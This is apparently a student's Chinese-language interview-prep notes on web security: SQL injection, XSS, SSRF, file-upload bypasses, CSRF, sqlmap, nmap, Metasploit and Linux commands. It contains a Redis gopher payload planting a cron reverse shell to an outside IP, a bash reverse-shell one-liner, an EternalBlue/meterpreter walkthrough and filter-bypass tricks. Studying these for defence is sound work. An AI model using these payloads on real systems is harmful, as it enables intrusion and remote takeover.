---
title: 面试prepare
date: 2023-04-06 23:33:41
excerpt: 面试prepare
categories: 学习
---



# 面试prepare

### 前言

本人最近准备找一份暑期实习，于是自己写了一份面经

写的不好，仅供参考



### sql注入

#### **常见的关系型数据库**

mysql、sqlserver、oracle、access、sqlite、postgreSQL

- mysql:3306 
- sqlserver:1433 
- orecal:1521 
- PostgreSQL:5432 
- db2:50000

- MongoDB:27017 
- redis:6379 
- memcached:11211

#### **SQL注入有哪几种注入类型？**

从注入参数类型分：数字型注入、字符型注入、搜索型注入 
从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入 ，

二次注入（参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入）

从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入



#### **SQL注入的危害及防御**

危害

- 数据库泄露 
- 数据库被破坏 
- 网站崩溃 
- 服务器被植入木马



防御

- 代码层面对查询参数进行转义 
- 预编译与参数绑定 
- 利用WAF防御



#### sql注入getshell

- 存在SQL注入漏洞
- web目录具有写入权限
- 找到网站的绝对路径
- secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）



#### 绕过方式

- 大小写
- 双写
- 注释符  /**/
- 编码绕过 %20 %09 %0a
- 括号绕过
- 将表明转为十六进制绕过引号
- join绕过逗号
- like绕过等于号



### xss

#### 原理

xss的本质是javascript代码执行，所以说原理就是用户在可控参数输入恶意的js代码，然后该代码被执行成功

#### 如何验证存在xss漏洞

第一步，寻找用户可控的参数（输入点）
 第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理
 第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过



#### xss有哪几种类型

##### DOM型XSS

攻击者将带有恶意js代码的参数传递到网站的前端页面中，该代码不会传入服务器直接在客户的浏览器执行。

##### 反射性型XSS

攻击者将带有恶意js代码的参数传递给网站，经过服务器的然后返回到客户端，在客户的浏览器执行。

##### 存储型XSS

攻击者将带有恶意js代码的参数传递给网站，经过服务器存储在数据库中，任何一个客户端在访问该条数据时，恶意的js代码都会在该客户端的浏览器执行。

#### xss危害

- 盗用用户的COOKIE
- 修改DOM
- 插入广告（黑页等）
- 发动xss蠕虫攻击
- 劫持用户行为，进一步渗透内网

#### xss修复

- 在服务端进行输入检测，过滤特殊字符
- 对输出内容进行编码转义
- 在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。
- 设置httponly为true



#### 绕过

- 双写

- 对不能构造script标签的情况下
  使用事件进行绕过

  ```
  <input  value='123' onclick='alert()'>
  ```

- 超链接绕过

  ```
  <a src=javascript:alert()>123</a>
  ```

  

### ssrf

#### 原理

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

#### 危害

SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。

内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。



#### 利用方式

SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。

以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：

```
curl -vvv 'dict://127.0.0.1:6379/info'
 
curl -vvv 'file:///etc/passwd'
 
# * 注意: 链接使用单引号，避免$变量问题
 
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```



#### 绕过

采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成

> - 8进制格式：0300.0250.0.1
>
> - 16进制格式：0xC0.0xA8.0.1
>
> - 10进制整数格式：3232235521
>
> - 16进制整数格式：0xC0A80001
>
> - 合并后两位：1.1.278 / 1.1.755
>
> - 合并后三位：1.278 / 1.755 / 3.14159267
>
> - 0.0.0.0这个IP可以直接访问到本地
>
> - `xip.io` 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，
>
>   例如192.168.0.1.xip.io，解析到192.168.0.1。



#### 防御方式

> - 过滤返回的信息
> - 统一错误信息
> - 限制请求的端口
> - 禁止不常用的协议
> - 对DNS Rebinding，考虑使用DNS缓存或者Host白名单

1. 限制访问方法只能使用GET
2. 限制访问的协议只能是http或https，其他协议直接拒绝访问
3. 检测特殊字符CRLF，存在则直接拒绝访问
4. 设置setInstanceFollowRedirects属性为false，禁止跟随302跳转；禁止跳转的目的是防止攻击者利用跳转访问内网，从而绕过之后的黑名单校验
5. 解析url中域名对应的ipv4地址：   
   1. 该地址先过黑名单校验，不允许是内网地址，利用正则表达式对ip进行过滤
   2. **使用ip对url中的域名进行替换，访问资源时都以ip进行访问**；这样可以防御DNS Rebinding类的攻击



### 文件上传

#### 基本概念

用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的命令。

    常见的安全问题：
    （1）上传的是脚本文件，服务器Web容器解释并执行了用户上传的脚本，导致代码执行。
    （2）上传的文件是病毒、木马，引诱用户或者管理员进行下载执行。
    （3）上传文件是钓鱼图片或者为包含了脚本的图片，在某些版本的浏览器中作为脚本执行，或被用于钓鱼欺诈。


![图片-1685330394483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png)



#### 文件上传漏洞方式

1.客户端方式

主要方式就是JS检查。
绕过：
（1）首先选择正常的文件进行上传
（2）用BurpSuit进行抓包修改后缀然后完成文件上传.
2.绕过文件上传检查功能
（1）白名单校对——%00截断

因为在很多语言中，比如CorPHP等语言的常用字符串处理函数中,0x00都被认为是终止符。如xxx.php%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为0x00字符截断的关系，最终会变成xxx.php。
原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。



#### 绕过

##### .htaccess文件

> htaccess 在站点的根目录下面，不是在[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)目录下，但是它属于apache的一个配置文件

其中.htaccess文件内容：SetHandler application/x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错



##### .user.ini

php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。

```
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
```

于是我们可以先上传.user.ini，然后上传一句话木马，让所有文件都包含了一句话木马

##### 前端js绕过

抓包直接修改

##### 黑白名单绕过可以上传

phtml php3 php4 php5 Php php (空格) php.，pphphp

##### 修改content-type,添加GIF89a头



### csrf

#### 原理

攻击者利用服务器对用户的信任，从而欺骗受害者去服务器上执行受害者不知情的请求。

攻击者会伪造一个用户发送给服务器的正常链接，其核心主要是要和已登录（已认证）的用户去发请求。CSRF不需要知道用户的Cookie，CSRF自己并不会发请求给服务器，一切交给用户



#### 防御

（1）避免在URL中明文显示特定操作的参数内容；

（2）使用同步令牌（Synchronizer Token）,检查客户端请求是否包含令牌及其有效性；（常用的做法，并且保证每次token的值完全随机且每次都不同）

（3）检查Referer Header，拒绝来自非本网站的直接URL请求。

（4）不要在客户端保存敏感信息（比如身份认证信息）；

（5）设置会话过期机制，比如20分钟无操作，直接登录超时退出；

（6）敏感信息的修改时需要对身份进行二次确认，比如修改账号时，需要判断旧密码；

（7）敏感信息的修改使用post而不是get

（8）避免交叉漏洞， 如XSS等

（9）禁止跨域访问

（10）在响应中设置CSP（Content-Security-Policy）内容安全策略



#### XXE

XXE（XML External Entity Injection）也就是XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时

服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部一般实体和外部参数实体）做合适的处理

导致可加载恶意外部文件 和 代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。



### sqlmap

#### 常用指令

-h                                           显示基本帮助信息

-hh                                         显示高级帮助信息

--version                                显示版本号

-v                                           详细等级（0-6 默认 1）
-u                                          指定目标url

-d                                          直接连接数据库

-l                                           从burp代理日志的解析目标

-r                                           从文件中加载http请求

-g                                          从google dork的结果作为目标url

-c                                          从INI配置文件中加载选项

1.    --purge      【重新扫描（--purge 删除原先对该目标扫描的记录）

2.    --tables      【获取表名

3.    --dbs         【检测站点包含哪些数据库

4.    --current-db    【获取当前的数据库名

5.    --current-user  【检测当前用户

6.    --is-dba   【判断站点的当前用户是否为数据库管理员

7.    --batch      【默认确认，不询问你是否输入

8.    --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）

9.    --threads 10  【线程，sqlmap线程最高设置为10

10.    --level 3        【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头
                                  的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
11.    --risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全

12.    -v   【详细的等级(0-6)
         0：只显示Python的回溯，错误和关键消息。
         1：显示信息和警告消息。
         2：显示调试消息。
         3：有效载荷注入。
         4：显示HTTP请求。
         5：显示HTTP响应头。
         6：显示HTTP响应页面的内容

13.    --privileges  【查看权限

14.    --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件

15.    --method "POST" --data "page=1&id=2"   【POST方式提交数据

16.    --threads number　　【采用多线程 后接线程数

17.    --referer  ""  【使用referer欺骗

18.    --user-agent ""     【自定义user-agent

19.    --proxy “目标地址″   【使用代理注入

1.指定目标url

```
sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1"
```

2.从文件中获取多个url

```
sqlmap -m 1.txt
```

3.从文件中加载HTTP请求

```
sqlmap -r  url.txt
```

4.利用google获取目标

```
sqlmap -g "inurl:\".php?id=1\""
```

5.从burp日志中获取目标

```
sqlmap -l    burp.txt
```

实例演示-sqlmap注入检测

1.GET参数注入

```
sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1"
```

2.POST参数注入

```
sqlmap -u "http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1"  --data="id=1"
```



1.   sqlmap -u  "http://www.xx.com?id=x"    【查询是否存在注入点

2.   --dbs         【检测站点包含哪些数据库

3.   --current-db    【获取当前的数据库名

4.   --tables -D "db_name"  【获取指定数据库中的表名 -D后接指定的数据库名称

5.   --columns  -T "table_name" -D "db_name"  【获取数据库表中的字段

6.   --dump -C "columns_name" -T "table_name" -D "db_name"  【获取字段的数据内容

POST注入：

    （1）目标地址http:// www.xxx.com /login.asp
    （2）打开brup代理。
    （3）点击表单提交
    （4）burp获取拦截信息（post）
    （5）右键保存文件（.txt）到指定目录下
    （6）运行sqlmap并执行如下命令：

用例：sqlmap -r okay.txt  -p  username

// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）



### AWVS

#### 介绍

Acunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过Web浏览器访问和遵循HTTP/HTTPS规则的Web站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。

AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。



#### 功能特点

- 自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试

- 业内最先进且深入的SQL注入和跨站脚本测试

- 高级渗透测试工具，例如HTPP Editor和HTTP Fuzzer

- 可视化宏记录器帮助您轻松测试web表格和受密码保护的区域

- 支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制

- 丰富的报告功能，包括VISA PCI依从性报告

- 高速的多线程扫描器轻松检索成千上万的页面

- 智能爬行程序检测web服务器类型和应用程序语言

- Acunetix检索并分析网站，包括flash内容，SOAP和AJAX

- 端口扫描web服务器并对在服务器上运行的网络服务执行安全检查

- 可到处网站漏洞文件



#### 工作原理

- 扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。

- 在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS分析每一个页面中需要输入数据的地方，进而尝试3所有的输入组合。这是一个自动扫描阶段 。

- 在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。

- 在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。



#### 页面介绍

主菜单功能介绍：主菜单共有5个模块，分别为Dashboard、Targets、Vulnerabilities、Scans和Reports。

- Dashboard：仪表盘，显示扫描过的网站的漏洞信息
- Targets：目标网站，需要被扫描的网站
- Vulnerabilities：漏洞，显示所有被扫描出来的网站漏洞
- Scans：扫描目标站点，从Target里面选择目标站点进行扫描
- Reports：漏洞扫描完成后生成的报告

设置菜单功能介绍：设置菜单共有8个模块，分别为Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings

- Users：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置
- Scan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描
- Network Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议
- Issue Trackers：问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等
- Email Settings：邮件设置，配置邮件发送信息
- Engines：引擎，引擎安装删除禁用设置
- Excluded Hours：扫描时间设置，可设置空闲时间扫描
- Proxy Settings：代理设置，设置代理服务器信息



### APPSCAN

#### 介绍

AppScan是IBM的一款web安全扫描工具，主要适用于Windows系统。该软件内置强大的扫描引擎，可以测试和评估Web服务和应用程序的风险检查，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。

#### 工作原理

1）通过探索了解整个web页面结果

2）通过分析，使用扫描规则库对修改的HTTP Request进行攻击尝试

3）分析 Response 来验证是否存在安全漏洞



### wireshark

#### 软件功能

1、分析网络底层协议；
 2、解决网络故障问题；
 3、找寻网络安全问题；

#### 软件原理

当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。`将网络接口设置在监听模式，便可以将网上传输的源源不断的信息截获。`嗅探技术常常用于网络故障诊断、协议分析、应用性能分析和网络安全保障等各个领域



#### 过滤

#### 协议过滤

tcp，只显示TCP协议的数据包列表
 http，只查看HTTP协议的数据包列表
 icmp，只显示ICMP协议的数据包列表

####  ip过滤

```
 ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表
 ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表
 ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表
```

#### 端口过滤

```
tcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。
tcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。
tcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。
```

####  Http模式过滤

```
http.request.method==“GET”, 只显示HTTP GET方法的
```

#### 逻辑运算符为 and/or/not

过滤多个条件组合时，使用and/or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为：`ip.addr == 192.168.1.104 and icmp`



### nmap

| 参数(注意区分大小写) | 说明                                                         |
| -------------------- | ------------------------------------------------------------ |
| -sT                  | TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。 |
| -sS                  | 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。 |
| -sF  -sN             | 秘密FIN数据包扫描、Xmas Tree、Null扫描模式                   |
| -sP                  | ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。 |
| -sU                  | UDP扫描，但UDP扫描是不可靠的                                 |
| -sA                  | 这项高级的扫描方法通常用来穿过防火墙的规则集                 |
| -sV                  | 探测端口服务版本                                             |
| -Pn                  | 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描 |
| -v                   | 显示扫描过程，推荐使用                                       |
| -h                   | 帮助选项，是最清楚的帮助文档                                 |
| -p                   | 指定端口，如“1-65535、1433、135、22、80”等                   |
| -O                   | 启用远程操作系统检测，存在误报                               |
| -A                   | 全面系统检测、启用脚本检测、扫描等                           |
| -oN/-oX/-oG          | 将报告写入文件，分别是正常、XML、grepable 三种格式           |
| -T4                  | 针对TCP端口禁止动态扫描延迟超过10ms                          |
| -iL                  | 读取主机列表，例如，“-iL C:\ip.txt”                          |

**1、扫描单个目标**

nmap ip

```
如：nmap 192.168.0.101
```

**2、扫描多个目标**

nmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。

```
如：nmap 192.168.0.101 192.168.0.110
```

**3、扫描一个范围内的目标**

nmap xxx.xxx.xxx.xxx-xxx

```
如：nmap 192.168.0.100-110
```

**4、扫描目标地址所在某网段**

namp xxx.xxx.xxx.xxx/xx

```
如：nmap 192.168.0.1/24
```

**5、扫描包含主机列表的文件中的所有地址**

nmap -iL <File path>

```
如：nmap -iL /root/target.txt
```

**6、扫描除了一个目标地址之外的所有地址**

nmap ip段 -exclude 被排除的ip

```
如：nmap 192.168.0.100-110 -exclude 192.168.0.103
   nmap 192.168.0.1/24 -exclude 192.168.0.103 
```

**7、扫描目标地址的指定端口**

nmap ip -p 端口1，端口2，端口3……

```
如:nmap 192.168.0.101 -p 80,8080,3306,3389
```

**8、扫描目标地址C段的在线主机**

nmap -sP ip段

```
如：nmap -sP 192.168.0.1/24
```

**9、扫描目标地址操作系统版本进行探测**

nmap -O ip

```
如：nmap -O 192.168.0.101
```

**10、扫描目标所开放的全部端口（半开式）**

nmap -sS -p 端口号(多个用“,”隔开) -v ip

```
如：nmap -sS -p 1-65535 192.168.0.101
```



### MSF

#### 简介

Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。



它本身附带数百个已知软件漏洞，**是一款专业级漏洞攻击工具**



#### 使用

根据漏洞名称搜索 : `search ms17_010`

1、运用辅助模块扫描目标

设置模块：`use auxiliary/scanner/smb/smb_ms17_010`

查看设置：`options` 

设置目标地址：`set rhosts 192.168.174.129`

目标端口默认是445，如果用nmap端口扫描windows文件共享服务不是开放在445端口上面，那这里需要进行修改，`set rport 目标端口`

设置好了之后，`run`或者`exploit` 进行攻击



2、设置攻击模块对目标进行攻击



使用攻击模块：`use exploit/windows/smb/ms17_010_eternalblue`

查看所需设置：`options` 

设置目标地址：`set RHOSTS 192.168.174.129`

设置目标端口：`set RPORT 445`

设置payload：`set payload windows/x64/meterpreter/reverse_tcp`

设置本地地址：`set LHOST 192.168.174.192`

攻击：`run`或者`exploit` 





### Linux命令

**命令：netstat**

用途：查看系统的网络连接状态、路由表、接口统计等信息

格式：netstat [选项]

常用选项：

- -a：显示所有活动连接
- -n：以数字形式显示
- -p：显示进程信息
- -t：查看TCP协议相关信息
- -u：查看UDP协议相关信息
- -r：显示路由表信息



**命令：network**

用途：启用、禁用网络接口配置

重启network格式：service network restart



**命令：chmod**

用途：权限控制命令

Linux系统下文件权限显示如下图所示，第一个数字，数字代表的意义为：

- – 普通文件
- d 目录
- s socket套接字
- l 软链接
- p 管道
- c 字符设备
- b 块设备

`uname -a`: 此命令可以查看当前Linux系统内核具体版本、使用的发行版版本、以及当前处理器架构!(这里的架构非常重要,大部分针对Linux攻击载荷都需要明确处理器架构才能使用)

存放系统信息的文件

- cat /etc/issue: 连接系统时显示的提示信息,默认一般会存放发行版名称等信息(PS:用户可能会把这个当成备忘录存放一些口令)
- cat /etc/*-release: 详细的发行版系统版本信息(不同的发行版可能名字会略有不同,并且此文件可能有多个,这种情况下我们可以使用通配符*来解决这个问题。ls /etc | grep "release""可以使用此命令来查看你系统中此文件夹具体有哪些!)
- cat /proc/version: 详细的系统内核信息,用于编译内核的gcc的版本以及内核编译的时间。
- cat /proc/sys/kernel/version: 系统内核信息,相当uname -v(/proc/sys/kernel文件夹中可以监视和调整Linux内核中的各种活动!但需要管理员权限!)




进程信息

    ps: 列出本用户当前使用的终端中运行的进程
        ps -elf: 显示详细的(-l)带UID,PPIP,C与STIME栏位(-f)现行终端机下的所有进程(-e)
        ps aux: 已用户为主的格式(u)显示所有用户(a)的所有终端机(x)下的所有进程
    top: 类似Windows的任务管理器

`cat /etc/passwd`: 可以登录系统或其他拥有正在运行的进程的操作系统的用户身份信息

`cat /etc/shadow`: 所有用户的密码安全策略,一般只有超级用户对此文件夹才有访问权限!

`cat /etc/sudoers`: 对权限的分配管理   

`ifconfig -a`: 查看网络、网卡相关信息

`hostname`: 显示、设置系统的主机名称



#### 反弹shell

```
bash -i >& /dev/tcp/192.168.0.4/7777 0>&1
```



### OSI模型

![图片-1685330434325](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png)**应用层：为应用程序或用户请求提供各种请求服务。**OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。

**表示层：数据编码、格式转换、数据加密。**提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。

**会话层：创建、管理和维护会话。**接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。

**传输层：数据通信。**建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。

**网络层：IP选址及路由选择。**通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。

**数据链路层：提供介质访问和链路管理。**接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。

**物理层：管理通信设备和网络媒体之间的互联互通。**传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。



### TCP/IP五层模型

#### ![图片-1685330444867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png)区别

TCP/IP协议中的应用层处理开放式系统互联模型（OSI）中的第五层、第六层和第七层的功能。

TCP/IP协议中的传输层不能保证数据包在该层总是能够安全可靠地传输，而开放式系统互联模型（OSI）可以做到。

TCP/IP协议还提供一项名为UDP（用户数据报协议）的选择。





### xss，csrf，ssrf区别

**相同点：**
 XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。

**不同点：**
 XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。

CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  

SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器